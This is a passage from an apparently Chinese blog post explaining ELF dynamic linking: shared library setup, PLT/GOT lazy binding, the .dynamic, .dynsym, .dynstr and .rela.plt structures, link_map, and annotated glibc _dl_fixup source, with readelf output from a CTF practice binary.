hello.c</span><br></pre></td></tr></table></figure><p>静态链接和动态链接的可执行文件的大小差距比较显著，因为静态库被链接后库就直接嵌入可执行文件中了</p><p>这样会带来两个弊端</p><ol><li>首先会浪费系统空间，如果多个程序链接了同一个库，则每一个生成的可执行文件就都会有一个库的副本，必然会浪费系统空间</li><li>并且一旦发现库中有问题或者需要升级，必须将链接该库的程序全部找出来，全部重新编译</li></ol><p><code>libc.so</code>中有300K条指令，2M大小，如果每个程序都采用静态链接，浪费的空间会很大，解决的办法是整个系统只有一个libc的副本，而每个用到libc的程序在运行时都可以用到libc中的代码</p><p>动态库的出现正是为了弥补静态库的弊端，因为动态库是在程序运行时被链接的，所以磁盘上和内存中只需要保留一份副本，因此节约了磁盘空间，如果发现了bug或者要升级也很简单，只需要更换原来的动态库即可</p><p>Linux环境下的动态链接对象都是以.so为拓展名的共享对象（Shared Object）</p><h3 id="动态链接的实现机制"><a href="#动态链接的实现机制" class="headerlink" title="动态链接的实现机制"></a>动态链接的实现机制</h3><ol><li><p>程序头表</p><p>可以使用 <code>readelf -l [fileName]</code>来查看动态链接的可执行ELF文件的程序头表，编译完成的地址是从 <code>0x00000000</code> 开始的，即编译完成之后最终的装载地址是不确定的。</p></li><li><p>关键技术</p><p>之前在静态链接的过程中提到过重定位的过程，那个时候其实属于链接时重定位，现在需要装载时重定位，只要使用了以下技术：</p><ul><li>PIC位置无关代码</li><li>GOT全局偏移表</li><li>GOT配合PLT实现的延迟绑定技术</li></ul><p>引入动态链接之后，实际上在操作系统开始运行应用程序之前，首先会把控制权交给动态链接器，它完成动态链接的工作后再把控制权交给应用程序</p><p>动态链接器的路径在<code>.interp</code>这个段中体现，并且通常它是个软链接，最终链接在像<code>ld-2.27.so</code>这样的共享库上。</p></li><li><p>.dynamic段</p><p>和动态链接相关的.dynamic段和它的结构，.dynamic段其实就是全局偏移表的第一项，即GOT[0]</p><p>可以通过<code>readelf -d [fileName]</code>来查看。</p><p>它对应的是<code>elf.h</code>中的<code>Elf64_Dyn</code>这个结构体。</p></li><li><p>动态链接器ld</p><p>对于动态链接的可执行文件，内核会分析它的动态链接器地址，把动态链接器映射到进程的地址空间，把控制权交给动态链接器。动态链接器本身也是.so文件，但是它是静态链接的。本身不依赖任何其他的共享对象，也不能使用全局和静态变量。这是合理的，因为动态链接器不能是动态链接的。</p><p>Linux的动态链接器是glibc的一部分，入口地址是<code>sysdeps/x86_64/dl-machine.h</code>中的<code>_start</code>，然后调用 <code>elf/rtld.c </code>的<code>_dl_start</code>函数，最终调用 <code>dl_main</code>(动态链接器的主函数)。</p></li></ol><h3 id="动态链接图示"><a href="#动态链接图示" class="headerlink" title="动态链接图示"></a>动态链接图示</h3><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222311516.png"></p><h3 id="动态链接库的构建与使用"><a href="#动态链接库的构建与使用" class="headerlink" title="动态链接库的构建与使用"></a>动态链接库的构建与使用</h3><p>创建好一个动态链接库之后，肯定是不可能只在当前目录使用它，为了能够全局使用动态链接库，可以将字节的动态链接库移动到<code>/usr/lib</code>下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mv libvector.so /usr/lib</span><br></pre></td></tr></table></figure><p>之后只需要在使用时加上<code>-l[linName]</code>选项即可，如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc main.c -lvector</span><br></pre></td></tr></table></figure><p>上面的库都要用到管理员权限，因为是系统级的动态链接目录。如果要创建自己的第三方库，最好创建一个自己的动态链接库目录，并将这个目录添加到环境变量<code>LD_LIBRARY_PATH</code>中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /home/song/dynlib</span><br><span class="line">mv libvector.so /home/song/dynlib</span><br><span class="line">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/song/dynlib</span><br></pre></td></tr></table></figure><p>动态链接库最好命名为：<code>lib[libName].so</code> 的形式</p><h2 id="动态链接的具体实现"><a href="#动态链接的具体实现" class="headerlink" title="动态链接的具体实现"></a>动态链接的具体实现</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="动态链接-1"><a href="#动态链接-1" class="headerlink" title="动态链接"></a>动态链接</h4><p>​在动态链接方式实现以前，普遍采用静态链接的方式来生成可执行文件。 如果一个程序使用了外部的库函数，那么整个库都会被直接编译到可执行文件中。ELF 支持动态链接，这在处理共享库的时候就会非常高效。 当一个程序被加载进内存时，动态链接器会把需要的共享库加载并绑定到该进程的地址空间中。随后在调用某个函数时，对该函数地址进行解析，以达到对该函数调用的目的。</p><h4 id="PLT表和GOT表"><a href="#PLT表和GOT表" class="headerlink" title="PLT表和GOT表"></a>PLT表和GOT表</h4><h5 id="PLT表-Procedure-Linkage-Table"><a href="#PLT表-Procedure-Linkage-Table" class="headerlink" title="PLT表(Procedure Linkage Table)"></a>PLT表(Procedure Linkage Table)</h5><p>PLT表是过程连接表，在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。</p><p>结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLT[0]  --&gt; 与每个函数第一次链接相关指令</span><br><span class="line">例：</span><br><span class="line">0x4004c0:</span><br><span class="line">0x4004c0:  ff 35 42 0b 20 00        push   QWORD PTR [rip+0x200b42]      // push [GOT[1]]</span><br><span class="line">0x4004c6:  ff 25 44 0b 20 00        jmp    QWORD PTR [rip+0x200b44]      // jmp  [GOT[2]]</span><br><span class="line">0x4004cc:  0f 1f 40 00              nop    DWORD PTR [rax+0x0]</span><br><span class="line">即：  </span><br><span class="line">    第一条指令为 push 一个值，该值为 GOT[1] 处存放的地址，</span><br><span class="line">    第二条指令为 jmp 到一个地址执行，该值为 GOT[2] 处存放的地址</span><br><span class="line"> </span><br><span class="line">PLT[1]  --&gt; 某个函数链接时所需要的指令,与 got 表一一对应</span><br><span class="line">例：</span><br><span class="line">0x4004d0 &lt;__stack_chk_fail@plt&gt;:</span><br><span class="line">0x4004d0:  ff 25 42 0b 20 00        jmp    QWORD PTR [rip+0x200b42]  // jmp GOT[3]  </span><br><span class="line">0x4004d6:  68 00 00 00 00           push   0x0                       // push reloc_arg</span><br><span class="line">0x4004db:  e9 e0 ff ff ff           jmp    0x4004c0 &lt;_init+0x20&gt;     // jmp PLT[0]</span><br><span class="line">即：</span><br><span class="line">    第一条指令为: jmp 到一个地址执行，该地址为对应 GOT 表项处存放的地址，在下文中会具体讨论这种结构</span><br><span class="line">    第二条指令为: push 一个值，该值作用在下文提到</span><br><span class="line">    第三个指令为: jmp 一个地址执行，其实该地址就是上边提到的 PLT[0] 的地址，</span><br><span class="line">                也就是说接下来要执行 PLT[0] 中保存的两条指令</span><br></pre></td></tr></table></figure><h5 id="GOT表-Global-Offset-Table"><a href="#GOT表-Global-Offset-Table" class="headerlink" title="GOT表(Global Offset Table)"></a>GOT表(Global Offset Table)</h5><p>GOT表是全局偏移表，在 ELF 文件中分为两个部分，.got存储全局变量的引用，.got.plt存储函数的引用。该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。d_tag &#x3D; DT_PLTGOT</p><p>结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GOT[0]  --&gt; 此处存放的是 .dynamic 的地址；该节(段)的作用会在下文讨论</span><br><span class="line">GOT[1]  --&gt; 此处存放的是 link_map 的地址；该结构也会在下文讨论</span><br><span class="line">GOT[2]  --&gt; 此处存放的是 dl_runtime_resolve 函数的地址</span><br><span class="line">GOT[3]  --&gt; 与 PLT[1] 对应，存放的是与该表项 (PLT[1]) 要解析的函数相关地址，</span><br><span class="line">            由于延迟绑定的原因，开始未调用对应函数时该项存的是 PLT[1] 中第二条指令的地址，</span><br><span class="line">            当进行完一次延迟绑定之后存放的才是所要解析的函数的真实地址</span><br><span class="line">GOT[4]  --&gt; 与 PLT[2] 对应，所以存放的是与 PLT[2] 所解析的函数相关的地址</span><br><span class="line"> .</span><br><span class="line"> .</span><br><span class="line"> .</span><br></pre></td></tr></table></figure><p><strong>两个表之间的关系</strong>、</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GOT[0]: .dynamic 地址                    PLT[0]: 与每个函数第一次链接相关指令</span><br><span class="line">GOT[1]: link_map 地址</span><br><span class="line">GOT[2]: dl_runtime_resolve 函数地址      </span><br><span class="line">GOT[3]  --&gt;  PLT[1]    // 一一对应</span><br><span class="line">GOT[4]  --&gt;  PLT[2]    // 相互协同，作用于一个函数</span><br><span class="line">GOT[5]  --&gt;  PLT[3]    // 一个保存的是该函数所需要的延迟绑定的指令</span><br><span class="line">GOT[6]  --&gt;  PLT[4]    // 一个是保存个该函数链接所需要的地址</span><br><span class="line"> .             .</span><br><span class="line"> .             .</span><br><span class="line"> .             .</span><br></pre></td></tr></table></figure><h4 id="一个段三个节"><a href="#一个段三个节" class="headerlink" title="一个段三个节"></a>一个段三个节</h4><h5 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h5><p>因为在加载过程中，.dynamic 节整个以一个段的形式加载进内存，所以说在程序中的 .dynamic 节也就是运行后的 .dynamic 段。该段主要与动态链接的整个过程有关，所以保存的是与动态链接相关信息，只需要关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三项分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，此处主要用于寻找与动态链接相关的其他节( .dynsym .dynstr .rela.plt 等节)。该段保存了许多 Elf64_Dyn 结构，该数据结构保存了一些其他节的信息。下面展示该段所保存的数据结构。p_type &#x3D; PT_DYNAMIC（值为 0x2）的段。</p><p>结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 该结构都有 64 位程序和 32 位程序的区别，不过大致结构相似，此处只讨论 64 位程序中的</span></span><br><span class="line"><span class="comment">// /usr/include/elf.h</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf64_Sxword  d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">                                          <span class="comment">// d_tag 识别该结构体表示的哪一个节，通过以此字段不同来寻找不同的节</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">       Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">                                         <span class="comment">// 对应节的地址，用于存储该结构体表示下的节所在的地址</span></span><br><span class="line">       Elf64_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">                                         <span class="comment">// 一般与上一个字段表示的值相同，区别暂时不了解</span></span><br><span class="line">     &#125; d_un;</span><br><span class="line"> &#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>其中Tag对应着每个节（<code>readelf -d</code> 命令将列出文件的动态节信息，包括它所依赖的共享库）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dynamic section at offset 0x908 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x4004b0</span><br><span class="line"> 0x000000000000000d (FINI)               0x400784</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x6008f8</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x600900</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400260</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x400360</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x400288</span><br><span class="line"> 0x000000000000000a (STRSZ)              94 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x600ae8</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           96 (bytes)</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000017 (JMPREL)             0x400450</span><br><span class="line"> 0x0000000000000007 (RELA)               0x4003f0</span><br><span class="line"> 0x0000000000000008 (RELASZ)             96 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x4003d0</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         1</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x4003be</span><br></pre></td></tr></table></figure><p>下图列出了该文件的所有节区，其中类型为REL的节区包含重定位表项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro$ readelf -S main_no_relro_64</span><br><span class="line">There are 29 section headers, starting at offset 0x14e0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000400200  00000200</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE             000000000040023c  0000023c</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260</span><br><span class="line">       0000000000000028  0000000000000000   A       5     0     8</span><br><span class="line">  [ 5] .dynsym           DYNSYM           0000000000400288  00000288</span><br><span class="line">       00000000000000d8  0000000000000018   A       6     1     8</span><br><span class="line">  [ 6] .dynstr           STRTAB           0000000000400360  00000360</span><br><span class="line">       000000000000005e  0000000000000000   A       0     0     1</span><br><span class="line">  [ 7] .gnu.version      VERSYM           00000000004003be  000003be</span><br><span class="line">       0000000000000012  0000000000000002   A       5     0     2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED          00000000004003d0  000003d0</span><br><span class="line">       0000000000000020  0000000000000000   A       6     1     8</span><br><span class="line">  [ 9] .rela.dyn         RELA             00000000004003f0  000003f0</span><br><span class="line">       0000000000000060  0000000000000018   A       5     0     8</span><br><span class="line">  [10] .rela.plt         RELA             0000000000400450  00000450</span><br><span class="line">       0000000000000060  0000000000000018  AI       5    22     8</span><br><span class="line">  [11] .init             PROGBITS         00000000004004b0  000004b0</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         00000000004004d0  000004d0</span><br><span class="line">       0000000000000050  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .text             PROGBITS         0000000000400520  00000520</span><br><span class="line">       0000000000000262  0000000000000000  AX       0     0     16</span><br><span class="line">  [14] .fini             PROGBITS         0000000000400784  00000784</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [15] .rodata           PROGBITS         0000000000400790  00000790</span><br><span class="line">       0000000000000004  0000000000000004  AM       0     0     4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS         0000000000400794  00000794</span><br><span class="line">       0000000000000044  0000000000000000   A       0     0     4</span><br><span class="line">  [17] .eh_frame         PROGBITS         00000000004007d8  000007d8</span><br><span class="line">       0000000000000120  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .init_array       INIT_ARRAY       00000000006008f8  000008f8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600900  00000900</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600908  00000908</span><br><span class="line">       00000000000001d0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600ad8  00000ad8</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600ae8  00000ae8</span><br><span class="line">       0000000000000038  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data             PROGBITS         0000000000600b20  00000b20</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [24] .bss              NOBITS           0000000000600b30  00000b30</span><br><span class="line">       0000000000000020  0000000000000000  WA       0     0     16</span><br><span class="line">  [25] .comment          PROGBITS         0000000000000000  00000b30</span><br><span class="line">       0000000000000029  0000000000000001  MS       0     0     1</span><br><span class="line">  [26] .symtab           SYMTAB           0000000000000000  00000b60</span><br><span class="line">       0000000000000648  0000000000000018          27    43     8</span><br><span class="line">  [27] .strtab           STRTAB           0000000000000000  000011a8</span><br><span class="line">       000000000000022f  0000000000000000           0     0     1</span><br><span class="line">  [28] .shstrtab         STRTAB           0000000000000000  000013d7</span><br><span class="line">       0000000000000103  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h5 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h5><p>动态符号表，存储着在动态链接中所需要的每个函数所对应的符号信息，每个结构体分别对应一个符号 (函数) 。结构体数组。 d_tag &#x3D; DT_SYMTAB(值为 0x6) 的节。Elf32_Sym[num]中的num对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; <span class="number">8</span></span><br></pre></td></tr></table></figure><p>结构如下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222311414.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;          <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">                                  <span class="comment">// 保存着该函数函数名在 .dynstr 中的偏移，可以结合 .dynstr 找到准确函数名。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;          <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;         <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section st_shndx;         <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;         <span class="comment">/* Symbol value */</span></span><br><span class="line">                                     <span class="comment">// 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL. </span></span><br><span class="line">  Elf64_Xword   st_size;          <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><h5 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h5><p>动态字符串表，表中存放了一系列字符串，这些字符串代表了符号的名称，在此处可以看成函数名。 这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。该结构是一个字符串数组。d_tag &#x3D; DT_STRTAB(值为 0x5) 的节。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Sym[<span class="number">6</span>]-&gt;st_name=<span class="number">0x4c</span>（.dynsym + Elf32_Sym_size * num）</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222311394.png"></p><p>相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong></p><h5 id="rel-plt-rela-plt"><a href="#rel-plt-rela-plt" class="headerlink" title=".rel.plt (.rela.plt)"></a>.rel.plt (.rela.plt)</h5><p>重定位节，保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，对 ELF 目标文件的某部分内容或者进程镜像进行补充或修改。每个结构体也与某一个重定位的函数相关。结构体数组。<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位。d_tag &#x3D; DT_REL(值为 0x11) &#x2F; d_tag &#x3D; DT_RELA(值为 0x7) 的节。</p><p>结构如下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222312470.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;            <span class="comment">/* Address */</span></span><br><span class="line">                                     <span class="comment">// 此处表示的是解析完的函数真实地址存放的位置，</span></span><br><span class="line">                                     <span class="comment">// 即对应解析函数的 GOT 表项地址</span></span><br><span class="line">  Elf64_Xword   r_info;              <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">                                     <span class="comment">// 该结构主要用到高某位，表示索引，低位表示类型</span></span><br><span class="line">                                     <span class="comment">// 例如：0x10000007 此处 1 表示索引，7 代表类型，主要用到 1 值</span></span><br><span class="line">                                     <span class="comment">//上边在 PLT 中的指令，每一个表项的第二条指令， PUSH 了一个索引，所 PUSH 的索引与此相关，也就是通过 PLT 中 PUSH 的索引找到当时解析的函数对应的此结构体的</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//与上一结构体类似，只是不同编译环境下产生的不同结构，作用相同，就不再次讨论</span></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf32_Addr    r_offset;            <span class="comment">/* Address */</span></span><br><span class="line">   Elf32_Word    r_info;              <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">     <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">   Elf32_Sword   r_addend;            <span class="comment">/* Addend */</span></span><br><span class="line"> &#125; Elf32_Rela;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro$ readelf -r main_no_relro_64</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.dyn&#x27; at offset 0x3f0 contains 4 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000600ad8  000500000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0</span><br><span class="line">000000600ae0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line">000000600b30  000700000005 R_X86_64_COPY     0000000000600b30 stdout@GLIBC_2.2.5 + 0</span><br><span class="line">000000600b40  000800000005 R_X86_64_COPY     0000000000600b40 stdin@GLIBC_2.2.5 + 0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.plt&#x27; at offset 0x450 contains 4 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000600b00  000100000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0</span><br><span class="line">000000600b08  000200000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0</span><br><span class="line">000000600b10  000300000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0</span><br><span class="line">000000600b18  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure><p>如图，在.rel.plt中列出了链接的C库函数，一下均以write函数为例，write函数的r_offset &#x3D;600b00，r_info&#x3D;100000007。</p><h4 id="扩充结构体（在-Full-RELRO-用到）"><a href="#扩充结构体（在-Full-RELRO-用到）" class="headerlink" title="扩充结构体（在 Full RELRO 用到）"></a>扩充结构体（在 Full RELRO 用到）</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span>&#123;</span>  <span class="comment">//由于并没有找到该结构体的定义，所以没有声明类型</span></span><br><span class="line">    r_version</span><br><span class="line">    r_map        <span class="comment">//指向 link_map</span></span><br><span class="line">    r_brk</span><br><span class="line">    r_state</span><br><span class="line">    r_ldbase</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="link-map结构"><a href="#link-map结构" class="headerlink" title="link_map结构"></a>link_map结构</h4><p>保存着 Binary 里面所有信息的一个结构体，该结构体很大，内容丰富。</p><p>主要字段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l_next：链接着该程序所有用到的 libary</span><br><span class="line">        上边提到的 GOT[1] 中保存的地址是第一层 link_map 中所表示的 libary，此时是指向的程序本身，</span><br><span class="line">        不过可以用 l_next 结构寻找下一层表示的 libary，以此来遍历程序中所用到的 libary，</span><br><span class="line">        并利用下边所提到的字段找到该层 libary 的名字、基地址、以及所有的 section 等信息。</span><br><span class="line">l_name：表示 libary 的名字</span><br><span class="line">l_addr：表示 libary 的基地址</span><br><span class="line">l_info[x]：指向该 libary 下的 .dynamic。</span><br><span class="line">        l_info[1] 指向 d_tag = 1 时所表示的 section ，所以可以改变 x 的值找到每个相关 section 的地址。</span><br><span class="line">        在链接过程中 binary 中的 section 地址，以及 libary 中的地址都是通过此方法确定的。</span><br></pre></td></tr></table></figure><h3 id="dl-fixup源码"><a href="#dl-fixup源码" class="headerlink" title="_dl_fixup源码"></a>_dl_fixup源码</h3><p>以下就是_dl_fixup用于函数重定向的代码，展示了函数重定向的流程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_TYPE(val)   ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_SYM(val)    ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_VISIBILITY(o)  ((o) &amp; 0x03)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]); </span><br><span class="line">    <span class="comment">//通过link_map找到DT_SYMTAB地址，进而得到.dynsym的指针,记作symtab     </span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">//通过link_map找到DT_STRTAB地址，进而得到.dynstr的指针，记作strtab</span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">  = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offset就是reloc_arg</span></span><br><span class="line">    <span class="comment">//将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf32_Rel指针，记作reloc </span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];   </span><br><span class="line">    <span class="comment">//将(reloc-&gt;r_info)&gt;&gt;8作为.dynsym下标，得到函数所对应的Elf32_Sym指针，记作sym</span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset); </span><br><span class="line">    <span class="comment">//l-&gt;l_addr 加载共享对象的基本地址</span></span><br><span class="line">    <span class="comment">//l-&gt;l_addr + reloc-&gt;r_offset即为需要修改的got表地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="type">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"> </span><br><span class="line">assert 